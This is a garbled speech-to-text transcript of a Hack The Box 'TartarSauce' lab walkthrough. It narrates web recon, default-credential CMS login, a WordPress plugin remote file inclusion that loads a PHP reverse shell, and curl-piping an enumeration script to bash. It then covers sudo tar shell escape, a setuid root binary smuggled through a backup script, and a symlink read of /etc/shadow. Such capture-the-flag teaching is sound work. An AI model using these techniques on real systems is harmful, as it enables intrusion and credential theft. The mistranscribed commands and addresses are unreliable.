 what's going on YouTube this is if second we do entered a sauce from hack the box this box was created by emergence and I haven't really done any prep work for this video so we're gonna see how it goes it may be a little bit more over the place than were used to my favorite thing about this box was simply its name tartar sauce and the name comes from using turtle escalate from a Apache user to a low privilege user and that low privilege user to route you have to exploit or twice hence the name terror sauce and I found that funny the very first exploit to get as the Apache user is unrelated you exploit a wordpress plugin get the Apache user and then you'll see the Apache user can execute her as a low privilege suitor user via sudo and if you didn't know how to execute commands Esther you can just do a search for GTFO bins get the Frick out bins and find that path then once you get on the box there is a service that runs every 5 minutes that users turn in a bad way that you can use to drop a set UID binary on it or exfil files owned by root and prep asked that way so let's just jump in as always we start off with the end lap so - SC for default scripts sv enumerate versions Oh a I'll put all formats but in the EM app direct and call it Turner sauce then the IP address of the box which is 1010 1088 can take some time to run so I've already ran it looking at the results we see just one port is open that is port 80 and of course it is HTTP and the server banner is saying it's Apache HTTP d2 for 1/8 ubuntu if we googled around for this version with Ubuntu we probably come across Launchpad net and Launchpad net would say this version of HTTP D is packaged with ubuntu xenial we also have the end map script HTTP - robots.txt go off it discovered a robots.txt file with 5 disallowed entries so if we went over to the webserver and went to robots.txt we would see the actual disallowed entries so let's try each one of these so the first one is web services tortora source so 10 1088 web-services tartar source that is not found going to the next one monster three zero one four let's try this we do get a blog but let's go and find all of them so file uploader 1010 1088 this is going to be a 404 as well we have developmental and all these are in the web services directory and then the final one is PHP myadmin so we do have monstre which is a it looks like a CMS it says version three zero four in the URL and down here it also says three zero four but I'm not gonna poke at this just yet because always like doing some type of recon in the background because recon takes a while to perform and you never want to wait on it so it's always smart to do that in the background while you're manly poking at something because it may take 30 minutes to run and if you run it you won't get the results for 30 minutes so if it takes 30 seconds set up set it up as soon as possible so we do go Buster - you for URL HTTP 10 10 10 88 and a lot of stuff was in that web services directory so I'm going to start there and the word list I'm gonna do is the same one as always so we'll do user share for list dirt Buster directory list 2 3 medium - oh four out file I think was a - W go Buster - H grep - o is L so let's go up so I can copy that copy this and do - OH will do go Buster - web services dot out so we have started that up and immediately it discovers a slash WP directory so I'm going to check that one out so 10 10 10 88 slash WP we have to do web services slash WP and we see powered by press and nothing's really working and WordPress puts a lot of absolute URLs in which means whenever they link a image a JavaScript it puts the whole domain name in that URL instead of just starting with the WordPress directory I'm going to view the source to see what the absolute URL is and we see it's HTTP colon slash 1010 1088 there is a mistake here you need two slashes before that so I'm gonna go turn burp suite on so for all URLs go into burp gonna go into my options tab scroll down to match and replace I'm going to replace the response body I'm going to match for HTTP colon slash 10 replace it with HTTP colon slash slash 10 and then we're gonna also add one to do the response header so HTTP colon slash 10 replace with HTTP colon slash slash 10 okay we have both of those replaced if we go and refresh the website we do have a working website so we can probably do I think it's WP dash login dot PHP to verify this is indeed WordPress so as I said we want recon going in the background so before I go back to monstre when do WP scan dash h for help we want - - URL um let's see what else is there I normally like doing enumerate all plugins so - II space AP and by default I think it only does vulnerable plugins but I like doing all known plugins because just because it doesn't have a known vulnerability for it doesn't mean it's secure it may just mean someone hasn't looked at it yet so knowing all the plugins is good because if there's not a vulnerability may want to go look for one see is it an L - - log is how we do out files so W piece can - - URL HTTP 10 1088 where / WP we want - efore enumerate AP all plugins - - log WP scan l think that should be good let this run we hit the webserver it detected that so numerating the version and soon as it does this I will go back and we'll poke at monster and just let this go in the background so I'm gonna rename this window to WP scan and there we go we have definitely hit WordPress so it's gonna take a while to scan all those plugins let's go over and look at monstre so we just have the looks like default welcome page let's go to hunt blog users login and registration and all of those hit not found so i am next going to check links let's try this one slash admin and admin page manager looks like both of these links do resolve Firefox is going a bit slow can't tell that's Firefox or Monster there we go so we do have the copyright from 2016 so chances are this hasn't been updated in a while we can try logging in with like admin admin that's probably a default cadential and we get in right away the very first thing I do normally when I get into a CMS let's try to edit the themes because themes are generally going to be PHP and if we can edit PHP code we can just get code execution right away so we can do hello world right here click Save and we get an error message so generally if we can't edit templates they are read-only that is a good thing to do on web servers because you don't want your admins getting code execution on your server you may think their admin anyways so why not well if you run on like a shared platform or in the cloud you may be able to get to other client data they can get to the database easier all sorts of bad things can happen so even if it's an admin still try stop them from getting shelves I'm gonna try a backup and we'll see if the backup directory is writable we see backup not created so it's looking like this entire monstre instance is read-only we can go to content files try to create a new directory we'll create the directory please subscribe says the directory was created but it doesn't look like it going to this page we should see probably the directory I'm guessing what uploads is we can select file and go to root HDB boxes turner sauce and we can create a new one touch test echo please subscribe to test and try to upload this file was not uploaded so it could be a bad extension or just still being in read-only we get a system info debugging is turned off it doesn't look like there's a way to edit this right now I'm just trying to see if we can change the config file at all so monstrous says stuff can be writable see settings maintenance mode let's try PHP PHP info try this okay that's weird just not like PHP will do this here please subscribe to this message and maintenance mode may just be a text file and we're failing to write to that text file and that's what I'm guessing because nothing gets accepted so let's go back to WP scan to see if that has finished we only got about ten seconds left so we'll let this enumeration finish and see if it found anything with wood breasts we could also go and do search boy on monstre see if there's anything there 3:04 file upload code execution we can't upload files folder deletion cross-site scripting we're already admin so that's not really relevant could also do like github monstre and if we go to the github page we can look at issues and we see stored cross-site scripting directory traversal and file deletion PHP code execution what is this one visit Google Analytics I don't see where he's actually editing the code snippets I guess we need write access there I going through github tickets is sometimes very painful found a few bugs just asking how to report remote code execution vulnerability we have this guy saying he found one then looks like the same day and maybe this was created before then nope same day reports it as a CBE and puts the instructions looks like he's uploading a plug-in that is a shell so that's nothing again requires upload what I'm looking for it is like a SQL injection or lfi RFI something to get code execution without placing a file and I don't really see anything they we could also go through the closed and look at that because maybe they updated the version and the change logs here but WP scan should be finished running so we'll just go over that and we see there is a guest book with a cross-site scripting and again cross-site scripting probably don't want to do that just because it's normally not a vector in CTF we can do search point on whoa and we see that this guestbook has a remote file inclusion so I'm going to take a look at it so search boy - X and the path to read it let's see advisory ID looks like we have W content plugins front-end captcha and then it allows for a RFI so horrifies a remote file include it's like a lfi but remote so it's going to go to this URL and potentially execute code let's try this so go to todo sauce we want to go to Web Services WP and then slash dog be content plugins and for this absolute path we want to put our IP so with 1010 14 let's see what are we I have config time 0 we are 1414 and we'll do slash please subscribe and earn a box would listen on port 80 run this go back and we see the web server 1010 1088 has initiated connection and try to get the file please subscribe WP - load PHP so we know the RFI is a pending WP - whoa PHP and maybe executing this code so let us make a directory dub-dub-dub and we want to locate PHP - reverse and then put a PHP reverse shell here this is one I like using users share laudanum PHP whatever so copy this will name this Rev dot PHP I guess just give it a short name so we want to type it go through all these comments and change the IP address so we want 10 10 14 14 and ports number I like doing 9001 probably should do 443 just for a firewall evasion generally works on that port but I don't think we have to worry about that Python M simple HTTP server on port 80 and it should be noted when hosting PHP scripts for RFI vulnerabilities I love using the Python web server and not like Apache because I can't count the number of times I had an RFI reach out to my PHP shell on Apache and Apache had the PHP module' eggs installed so Apache would execute it on my box and give me a shell to myself and I just be confused so during the Python - mmm simple HTTP server won't execute PHP code so we don't have to worry about that we should also listen on port 9000 1 and when we oh we don't want to call it Rev we called the file just rev PHP we actually want to call that WP - to load dot PHP so let's fix that because that's what the web server is going to be getting so just make that RFI go to 10 10 14 14 the web server is going to append WP - load PHP and if it's going to execute we'll get a shell and we got a shell as www dot a and the you name is saying it's Linux trigger sauce so we know we're on the box so Python - C and port PTY PTY not spawn and bash and then we'll do st - why raw - echo and this gives us the ability to do tab or to complete control season stuff and then type F GNA to get back in so the very first thing I want to do is get a verb dub dub HTML web services let's go into monstre find dot - I think writable is no me a flag that's ugly before I do that let's do team almighty monks stty - a we are a thirty eight rows and one hundred and forty six columns so let's go back to a shell and do s TTY rows thirty eight columns that's a 138 and now a shell is a bit better we can't clear I did control L it doesn't do that typing clear sets term environment variable not set someone do export term is equal to X term - color and there we go so environments properly set now we can do fine - writable and we know see only two files are writable we have sitemap XML and pages one page txt so potentially we may have a code execute best if we edited this page but I'm not positive may be worth checking if you want to play around with this box but let's go back into a home directory which is just by a dub dub dub and I'm going to host another foul on a web server I'm gonna copy opt linen um and Lebanon s H over here and then we'll just execute this so we'll do curl 1010 1414 / when a new message type it to bash if you don't have this just go like github when a new message and this is the one it is so off reboot uses the one I have running right now so let's go on top in a new and we don't have thorough test running so set UID and GID binaries will not be checked we could edit the script or pass the argument if we wanted to check that so let's see the kernel is from 20:18 so relatively recent probably right around the time the box compiled Harris names terror sauce with dub-dub-dub data we have two users who have logged into the system root and a pneumo group memberships looks like the syslog user it may be an admin I think that's what that's saying pneumo root we can sudo without supplying a password so this did sudo - L and we see we can execute the bin tar file so if we do sudo - L to confirm this we do see that yes we can execute tur with no password as the Numa user so the first thing I do when I do that is I Google GTFO bins github and GTFO bins stand for get the Frick out bins and they are wonderful so let's go over to GTFO bins it's very much like wall bins if you familiars are living off the land binaries but right now there's a hundred and twelve binaries we're gonna type tar and we can see all the functions for this so the binary tar func like interesting things shell command file write file reads so if we look at shell we can see tur CF Devon all Devon all checkpoint checkpoint action exact bin SH will execute that we see it has a way to write files with Tara Reid files with tar so we could potentially write a SSH key to a numa's directory but it won't work because well it may work but we can't really abuse it because SSH wasn't listening but there is a pseudo one so sudo Tora let's just copy this paste this in and it's asking for the password because we have to specify the - u flag so - you owe and um a and hit enter and we get a shell so ID we're now and NUMA I'm just gonna change that to be Ben - instead of sh to make it a bit more pretty and we have escalated to a new ma so let's go in his home directory see what's there we have a MySQL history file creates a database called back up or not really that interesting shadow back up to dev null not sure what that is so nothing too interesting then let's do that curl command again so curl 10 10 14 14 when a new mess h-pipe it over to bash and run this again this can take a few seconds to run it should have enough good info so we made two passwd last time so let's keep going down so home directories nothing really there environment variables cron jobs not really looking like there's anything that isn't standard crontab contents again that's just running all the carnale we daily weekly stuff system d timers we see backup or timer and this is definitely not a normal service we see it's got three minutes in two seconds left and it passed one minutes 57 seconds ago so it looks like this is running every five minutes system D timers are just a new way to kind of do cron jobs from services so we can probably do a locate command on back up or and get what the system D stuff is so locate backup and let's look at these files so looking at the backup early that timer we see the description runs it every five minutes on boot five minutes backup road service want to buy multi-user our target which is the default run level so let's check the next thing out the actual service for system D and nothing there we got a user s been back / so let's look at what this is does it may be a fine binary file let's do yes to view anyways and we get a looks like a bash script then bash is at the top so let's them user s pin back upper and we'll change the color to l4 because that may be easier to read so let's see what us whoops well we got a lot of pains open let's send this pain away two three go here send this pain away two three and then oh come on just getting a pain on the right so I can do notes so let's see color L word again and all them did not like me changing this that is ugly so let's quit that just cat this file s Bend back upper and we're going to copy this and do this locally good new pain okay notes down SH and it anyway then back up SH paste this in I have to do set paste set paste type it it set paste there we go paste that color I'll Ford so sending a bunch of variables those look important so I'll put those in my notes copy this over here and paste so we have baster is ver dub dub dub HTML backup directory is where backups temp directory is where a temp we got a test message and the error message and these are going to paths to the backup directory and a new my backup test and backup error screen a temp file and that temp file is just creating a random sha-1 sum we see it heading a bunch of stuff at a you random piping to sha-1 some and grabbing looks like the first field which will be the hash so I'm just gonna rename this in here to be rnd and then check is temp directory slash check so let's see what check is such the code for check going down at the very beginning we're deleting check check is used in this integrity check function that it creates doing user bin diff on base dirt and check baster so let's do comment here base directory is going to be verdict of dub HTML and check baster is let's see check is temp directory so for a temp check and then base Dora and I think that I look better if we put that on the bottom line there we go okay so we're going to make the directory check and it looks like zxv F we're extracting something into check so Z is gzip X is extract V is verbose F is file - capital C means change to this directory before running tar so check is getting stuff extracted and then after it extracts it runs integrity check to do a diff against it so kind of have an idea what the script is doing let us put notes so we know the script runs every five minutes and I don't like that color hello oh Lord there we go and the very first thing the script does is well print messages that we don't care about but it does a delete on temp directory so deletes temp stuff and that stuff was created by this script the next thing it does is a tar as the pneuma user z cv f so gzip create verbose file and it's going to turn up a temp file temp file is the foul name and it's going to do base directory so dub dub dub HTML - random stuff the next thing we do is oh that's interesting it does this ampersand so it's not going to wait for this command to finish this is back rounded so it immediately as soon as it starts turning things up it goes to the next thing which is sleep for 30 seconds then this is defining a function I wish that was up top it would just make it more easier to read it's not doing that immediately we're going to make the directory tract and then extract temp file which is the tar we had just created so after 30 seconds extract what we created and integrity check so the integrity check is diff bingo Dubb HTML in for a temp dub dub dub HTML every time check HTML I have them in comments keep going down so if success then exit 2 & 2 is an error so if the diff runs exit 2 I guess then we got an else and we are going to looks like clean up and save the archive so delete files and exit 0 there's what it looks like it's doing so if we can go down this success path we can have tar extract all the files and then not delete them up until the next time the script is ran which is with probably 4 minutes and 30 seconds because right here is the script running then we create a tour sleep for 30 seconds extract the tar we created and then if it's successful it exits doesn't clean up what we created until the next time it runs which is the next 5-minute interval if it isn't sexual it deletes files so what we have to do is figure out how to make this if-then fail so let's do what is it if then we can do diff - our dub dub dub HTML and we'll do dub dub or we'll do sov then echo success else I do I do that then just do else like this echo fail fee and diff ver WW HTML no such file or directory / dub dub dub HTML that's weird there is a directory there oh I have for dub use so we did that and we hit the fail loop so if a directory is not valid it goes to fail which then means it deleted files and if it is successful if all the directories exist it will go into the success so what we have to do is create a archive that has ver www HTML so when it extracts it adds those directories and the diff command is valid so we go back to a shell we can name this shell we can go to temp then we can do make the dub dub dub HTML one do - P so it creates all this directories and what I mean is if we just created a file so what great please subscribe and then enter CVV CBF i think they did z4g zip but test and we do please subscribe when it extracts this our test is actually a gzip let's read on that command test tar.gz so we remove please subscribe to our z XV f test or gz it's just going to place the please subscribe file here and then when the command runs it's going to do a diff - over tab the www HTML and then tab dub dub dub HTML there's a check directory here I just didn't feel like creating it and that commands going to fail because let's erase that and that diff command is going to fail because there's no such file or directory however if we had put these directories init are they will be existing hopefully that makes sense HTML so RM please subscribe and never tell for make directory - be verb dub dub HTML so what we want to do is create a set UID file because turret keeps the file permissions so when it extracts this we want it to have a set UID for a set UID file so we can just execute and get root so let's check if we have GCC we do not locate - our GCC just to see if it's not our path and user lib GCC and we doesn't look like we have the binary so let's go over to a calli box and you name - a it is 32-bit so let's copy set UID shelves set UID dot C and I think I created this in the jail video just a simple set UID file we're gonna set real user ID 0 0 that is routes user and routes group and then execute bin SH so I think Bash actually drops set UID so I my food work if it's bash may work so we do GCC - M 32 for 32-bit - oh for out file will call this please subscribe and then the file name which was set u ID dot C and if this doesn't work on your Kali it's I think app search GCC - multi Lib this a package yep so just do app install GCC - multi Lib and it will installs things so you can compile to what you need so we need to send this file over to the box so just do netcat LVN p to listen and direct that file into netcat and we'll do we have to do a port 9000 - so it's listening on port 9000 to whoever connects to it gets the file so netcat ten ten fourteen fourteen nine thousand two and well-directed - please subscribe and we see the foul there we can do file on it see it's a 32 bit elf we can chmod 6-0 0 6 5 5 4 5 the first 6 is set UID and set g ID then read execute for owner group and everyone so do that to please subscribe dot slash please subscribe execute but since it's not owned by root the set UID does work so we can go up we have to create the file so remove test will create let's see turn Z CBF would create please subscribe to our GZ tear up ver so now we just have to do systemctl I think list timers and we can see how much time is left we see 1 minute and 16 seconds I can do watch - and one which is gonna run a command every second systemctl list timers and now we see and it really doesn't like this window being open let's exit this pane do that again and we see it's running that command every single second and updating this so in 40 seconds the scripts going to kick off it's going to tar up verb dub dub HTML I'm going to replace what it turns up with what I turn it up so when it extracts it it extracts it as root and hopefully I can just set UID so hopefully that makes sense maybe will make sense in 20 seconds when this kicks off there's 5 seconds left if you're wondering if that was a fast 20 seconds yeah I edited the file of that video to save you waiting 10 seconds we do LS - la we see it created that random junk so I'm gonna copy please subscribe to our GZ into that random junk file and we can remove this ver we don't need anymore and now we're just waiting for it to hit the 30-second mark because it's now it's in the sleep 30 to create the check directory and extract everything into check so we got another two seconds left so we should see it created check as route so if we go in the directory do LS - la we see our file there but oh it's still owned by an uma so looks like we forgot to do something and that is change the owner to root and you'll see we can't do that because well we just don't have permission to change owners as root because that would be bad if we could just change any file as root fortunately for us that Tower embeds the user ID that earns the file in the actual archive so what we can do is go back to our box create the dub-dub-dub HTML place the please subscribe binary and there and then turn up here because i whoops dub dub dub HTML do chmod six five five five because now in the tar archive it is owned by root has the set UID and is executable by anyone so we can do tur ZX c VF not ZX z c VF - gzip create verbose file so we want to create or call this set UID tar.gz and specify the directory which is fer oka is up everything we can do that neck cat ll v NP 9000 to direct set UID go back to a shell go to attempt and see well one more directory neck cat 10 10 14 14 nine thousand two and we'll call this what set you ID tar.gz go back to a watch command and see that we have two minutes and 25 seconds left until we can get the code execution so I'm going to pause the video and we'll resume when it has five seconds left so we got five seconds left the script should run do LS - la it looks like that's the same hash as last time there we go it changed so I'm going to copy set UID overtop of one 6f that new RAM directory it created and we see the same file size we can get rid of this please subscribe to our GZ so it does confuse us and now we're just waiting for it to extract the file and see if it extracted it as root and left our permission intact so we got three seconds left do an LS - la there is that check directory so we got 4 minutes and 30 seconds left of this looking at verb dub dub HTML we see the files there it's owned by root because if the tar archive said it was and the server made it it's very much like the NFS stuff if you remember back from again the jail video so we can do ID we see we are root LS dash L a WC - C on root txt we can see we can read the file it's 330 characters long which is an md5 sum in a line break and that is the box we can look at the MySQL history here and this is probably setting up WordPress or monstre not sure what this is doing where option site URL so this is updating WordPress option set option value equal to and he screwed up right here so it looks like when he was mainly creating the WordPress database he forgot to do double slashes so my guess is he was hand jamming this in and decided to leave it because he enjoyed WordPress not working exactly as you'd expect there is another thing we can do to this binary so we can show this real quick and it's going to it's actually pretty cool so ver dub-dub-dub ver temp so we could have just done make der - beaver dub-dub-dub HTML and if we look at ver was it back up let's get out of Route exit so we look at I think it was very back up a Numa backup test is what outputted the information to backup error shows the output of the diff so this is the integrity check and we can see our file there and if files were different it actually outputs here so if we do make dot dot dot or I'm - RF set UID doctor we don't need anymore make there - be ver dub dub dub HTML and let's see I think index dot HTML was in this one / dub develop HTML so yeah we can just replace any file with a sim link to a file we can't read and then when root extracts it it's going to do a diff and let us read it so let's see Ln - s to create a symbolic link we want one on shadow and we'll name this index.html so we have invert dub dub HTML we have a shortcut - from index.html to Etsy shadow of course we can't read that because the sim link takes the permissions of what you're linking to but root can read that and routes running this so let's try this up souter z cv f on will call this symlink tar.gz and let's do the watch we have about 15 seconds left for we got 40 seconds left until it starts so again what this is doing is when extracts it it's doing a diff on everything it's gonna differ www.h tml index.html and the one we had created which points to as a shadow and write the dead Frances to that backup error text file which will show shadow it's kind of a gimmick on this box but I have seen cases where you can actually do this it backs up things and sends it to a remote server and actually sends the full file and not the same link so we got five seconds left and we should get a new file name so instead of one six that is one seven so copy a symlink overtop of this and we just got to wait for the 30-second mark to hit so it unties this and then does a diff so about 10 more seconds and we should see a file get updated so see unless we can by just tail - eff this file and there we go we have the shadow because again it dipped index.html oh my god that's a lot of line breaks now what the file actually looks like HTML index cannot go why do not see this 1010 1088 oh I never actually viewed this page we just saw web services and home dinh on it we get a giant thing of tartar sauce if we open the view source he put a bunch of line breaks and saw the carry on we just didn't do that because we honed in on web services after seeing the robusta text file but in that back up area log we do have the etsy shadow output you could have done route text and got it that way but getting it through a shell is much more cooler than just getting a file read hope you guys enjoyed that box take care and I will see you all next week you